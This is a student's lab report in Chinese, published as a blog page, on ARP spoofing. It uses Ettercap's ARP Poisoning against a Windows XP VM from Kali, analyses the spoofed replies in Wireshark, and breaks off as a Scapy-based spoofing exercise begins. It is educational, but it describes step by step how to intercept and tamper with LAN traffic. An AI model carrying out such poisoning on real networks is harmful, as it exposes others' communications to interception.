@@ -1,0 +1,393 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全实验1：ARP欺骗 | lhldudu's blog</title><meta name="author" content="Harrisonls2004"><meta name="copyright" content="Harrisonls2004"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ARP欺骗课堂实验实验目的运行WinArpAttacker或Ettercap（二选一），通过WireShark等抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。 实验环境（1）攻击机：Kali-linux 2022.3 （2）靶机：windows xp （3）软件：ettercap-0.8.31，wireshark 实验过程与结果步骤一：搭建实验环境并查看虚拟机信息1.配置攻击机Kal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全实验1：ARP欺骗">
+<meta property="og:url" content="https://harrisonls2004.github.io/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/index.html">
+<meta property="og:site_name" content="lhldudu&#39;s blog">
+<meta property="og:description" content="ARP欺骗课堂实验实验目的运行WinArpAttacker或Ettercap（二选一），通过WireShark等抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。 实验环境（1）攻击机：Kali-linux 2022.3 （2）靶机：windows xp （3）软件：ettercap-0.8.31，wireshark 实验过程与结果步骤一：搭建实验环境并查看虚拟机信息1.配置攻击机Kal">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://harrisonls2004.github.io/img/wlaq.jpg">
+<meta property="article:published_time" content="2025-10-16T05:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-28T09:00:14.191Z">
+<meta property="article:author" content="Harrisonls2004">
+<meta property="article:tag" content="北邮">
+<meta property="article:tag" content="实验">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://harrisonls2004.github.io/img/wlaq.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "网络安全实验1：ARP欺骗",
+  "url": "https://harrisonls2004.github.io/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/",
+  "image": "https://harrisonls2004.github.io/img/wlaq.jpg",
+  "datePublished": "2025-10-16T05:00:00.000Z",
+  "dateModified": "2026-01-28T09:00:14.191Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Harrisonls2004",
+      "url": "https://Harrisonls2004.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://harrisonls2004.github.io/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: Harrisonls2004","link":"链接: ","source":"来源: lhldudu's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网络安全实验1：ARP欺骗',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/universe.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 演唱会</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/wlaq.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/logo.png" alt="Logo"><span class="site-name">lhldudu's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">网络安全实验1：ARP欺骗</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 演唱会</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">网络安全实验1：ARP欺骗</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-16T05:00:00.000Z" title="发表于 2025-10-16 13:00:00">2025-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-28T09:00:14.191Z" title="更新于 2026-01-28 17:00:14">2026-01-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%AC5%E5%AD%A6%E6%9C%9F%E5%AE%9E%E9%AA%8C/">第5学期实验</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%AC5%E5%AD%A6%E6%9C%9F%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">网络安全实验</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="ARP欺骗课堂实验"><a href="#ARP欺骗课堂实验" class="headerlink" title="ARP欺骗课堂实验"></a>ARP欺骗课堂实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>运行WinArpAttacker或Ettercap（二选一），通过WireShark等抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。</p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>（1）攻击机：Kali-linux 2022.3</p>
+<p>（2）靶机：windows xp</p>
+<p>（3）软件：ettercap-0.8.31，wireshark</p>
+<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：搭建实验环境并查看虚拟机信息"><a href="#步骤一：搭建实验环境并查看虚拟机信息" class="headerlink" title="步骤一：搭建实验环境并查看虚拟机信息"></a>步骤一：搭建实验环境并查看虚拟机信息</h4><p>1.配置攻击机Kali-linux 2022.3（自带ettercap）。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img1.png" alt="图1 打开攻击机kali"></p>
+<p>2.在kali虚拟机中右键选择”在这里打开终端”，使用ifconfig命令查看kali虚拟机网卡、ip地址、网关地址等信息。如图1.2所示，可知kali虚拟机的ip地址为192.168.204.134，Mac地址为00:0c:29:a5:82:6c。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img2.png" alt="图2 ifconfig命令查看kali虚拟机信息"></p>
+<p>3.配置靶机windows xp。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img3.png" alt="图3 打开靶机windows xp"></p>
+<p>4.在windows xp虚拟机中按”win+R”输入”cmd”打开命令行，使用命令ipconfig &#x2F;all查看虚拟机网卡、ip地址、网关地址等信息。如图1.4所示，可知windows xp虚拟机的ip地址为192.168.204.135，默认网关为10.21.128.1，Mac地址为00:0c:29:5D:E8:C3。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img4.png" alt="图4 ipconfig /all命令查看xp虚拟机信息"></p>
+<p>5.两虚拟机实施ping通：</p>
+<p>（1）kali PING windows xp</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img5.png" alt="图5 kali ping通xp"></p>
+<p>（2）windows xp PING kali</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img6.png" alt="图6 xp ping通kali"></p>
+<p>6.在靶机windows xp命令行中使用arp -a命令查看靶机被攻击前的arp信息。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img7.png" alt="图7 靶机被攻击前的arp信息"></p>
+<h4 id="步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理"><a href="#步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理" class="headerlink" title="步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理"></a>步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理</h4><p>1.在kali中，使用命令sudo ettercap -G打开ettercap图形化界面。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img8.png" alt="图8 在kali中打开ettercap"></p>
+<p>2.选择当前网卡eth0后，点击右上角”√”后开始嗅探，点击搜索按钮扫描该网段的所有主机信息，再点击🔍右侧按钮在host list中查看扫描结果。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img9.png" alt="图9 当前网卡开始嗅探"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img10.png" alt="图10 扫描该网段所有的主机信息"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img11.png" alt="图11 在host list中查看扫描结果"></p>
+<p>3.分别将靶机windows xp的IP和网关地址设为目标1和目标2。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img12.png" alt="图12 设置目标1和目标2"></p>
+<p>4.在MITM菜单中选择ARP Poisoning，点击ok开始攻击。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img13.png" alt="图13 选择ARP Poisoning"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img14.png" alt="图14 点击OK开始攻击"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img15.png" alt="图15 显示ARP poisoning victims"></p>
+<p>5.在靶机windows xp中打开命令行输入”apr -a”命令，查看被arp投毒后的靶机arp信息。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img16.png" alt="图16 被arp投毒后的靶机arp信息"></p>
+<p>6.与被攻击前的靶机arp信息比较，发现Mac地址（Physical Address）由原Mac地址00:50:56:e8:44:a5变为攻击机kali的Mac地址00:0c:29:a5:82: 6c。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img17.png" alt="图17 比较被攻击前后靶机arp信息中的Mac地址"></p>
+<p>7.由此可知，在arp表下靶机的Mac地址已经变成了攻击者的Mac地址，则靶机的信息将全部被kali攻击机截获，并且攻击机可以向靶机发送篡改后的信息，由此实现arp欺骗中间人攻击，信息的保密性和完整性都将受到破坏。</p>
+<h4 id="步骤三：使用wireshark抓包分析ARP欺骗网络流量"><a href="#步骤三：使用wireshark抓包分析ARP欺骗网络流量" class="headerlink" title="步骤三：使用wireshark抓包分析ARP欺骗网络流量"></a>步骤三：使用wireshark抓包分析ARP欺骗网络流量</h4><p>1.在kali虚拟机中打开终端，输入”sudo wireshark”命令以root用户权限启动wireshark。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img18.png" alt="图18 打开wireshark"></p>
+<p>2.在嗅探过程中，选择接口”eth0”，点击左上角开始按钮进行抓包。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img19.png" alt="图19 wireshark开始抓包"></p>
+<p>3.查看捕获的数据包可以在协议Protocol一栏找到”ARP”即为ARP欺骗攻击的数据包，观察信息info一栏均为192.168.117.133(&#x2F;2) at 00:0c:29:f1:f1:c4。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img20.png" alt="图20 应用发起arp欺骗攻击的数据包"></p>
+<p>4.点击展开Address Resolution Protocol（reply）查看ARP部分抓包细节。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-1.png" alt="图21-1 arp部分抓包细节"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-2.png" alt="图21-2 arp部分抓包细节"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-3.png" alt="图21-3 arp部分抓包细节"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-4.png" alt="图21-4 arp部分抓包细节"></p>
+<p>5.由以上详细信息可以看到，wireshark抓到了kali攻击机（Mac地址为00:0c:29:a5:82:6c）向靶机windows xp网关地址（IP地址为192.168.204.135）发送ARP欺骗包。</p>
+<p>（1）攻击机kali向靶机windows xp发送ARP包，包中的Mac地址为kali自己的Mac地址00:0c:29:a5:82:6c，但IP地址为靶机的IP地址192.168.204.135，以此欺骗过靶机。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img22.png" alt="图22 攻击机发送arp欺骗包"></p>
+<p>（2）在靶机存入的ARP缓存表中，靶机对应的IP所保存的是攻击机kali的Mac地址，因此发送给靶机windows xp的信息将可以被攻击机kali截获。</p>
+<p>（3）最终发送给靶机的内容和靶机发送的内容都先经过攻击机kali，由此攻击机可以截获每次通信的内容，但不会破坏靶机正常通信。在此基础上，攻击机甚至还可以篡改通信所传输的内容，而不被靶机发现。</p>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>通过本次Ettercap的ARP欺骗实验，我深入掌握了ARP协议的工作原理及其安全缺陷，并成功使用Ettercap工具实施了ARP欺骗攻击。在实验过程中，我不仅学会了发起攻击，还运用Wireshark抓包分析了ARP数据包的结构和欺骗后的网络流量变化。这一实践让我直观理解了中间人攻击的实现过程，增强了我对局域网安全风险的认识，也为我今后进一步学习网络攻防技术奠定了扎实基础。</p>
+<h2 id="ARP欺骗课后实验"><a href="#ARP欺骗课后实验" class="headerlink" title="ARP欺骗课后实验"></a>ARP欺骗课后实验</h2><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>基于Winpcap（或其它网络开发包Libpcap&#x2F;Jpcap&#x2F;Scapy等）编写程序，对指定的目标IP地址进行ARP欺骗攻击。</p>
+<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>(1) 攻击机：Kali-linux 2022.3</p>
+<p>(2) 靶机：windows xp</p>
+<p>(3) 软件：ettercap-0.8.31，wireshark</p>
+<h3 id="实验过程与结果-1"><a href="#实验过程与结果-1" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：安装Scapy"><a href="#步骤一：安装Scapy" class="headerlink" title="步骤一：安装Scapy"></a>步骤一：安装Scapy</h4><p>1.在攻击机kali中打开终端，输入命令“sudo apt install python3-pip”安装pip3。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p1.png" alt="图1 kali安装pip3"></p>
+<p>2.在攻击机kali终端中输入命令“pip3 install Scapy”安装Scapy。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p2.png" alt="图2 kali安装Scapy"></p>
+<h4 id="步骤二：python编写ARP欺骗程序"><a href="#步骤二：python编写ARP欺骗程序" class="headerlink" title="步骤二：python编写ARP欺骗程序"></a>步骤二：python编写ARP欺骗程序</h4><p>1.实验环境：攻击机：kali；靶机（受害者）：windows xp</p>
+<p>2.查看攻击机及靶机信息：首先通过靶机windows xp的ipconfig &#x2F;all命令查看靶机的IP地址、Mac地址、网关等信息；通过攻击机kali的ifconfig命令查看攻击机的IP地址及Mac地址。</p>
+<p>此部分信息同课上实验中两主机信息：</p>
+<p>kali：IP地址：192.168.204.134；Mac地址：00:0c:29:a5:82:6c</p>
+<p>windows xp本机：IP地址：192.168.204.135；Mac地址：00:0c:29:5D:E8:C3</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p3.png" alt="图3 ipconfig /all查看靶机信息"></p>
+<p>windows xp网关：IP地址：192.168.204.135；Mac地址：00:50:56:e8:44:a5</p>
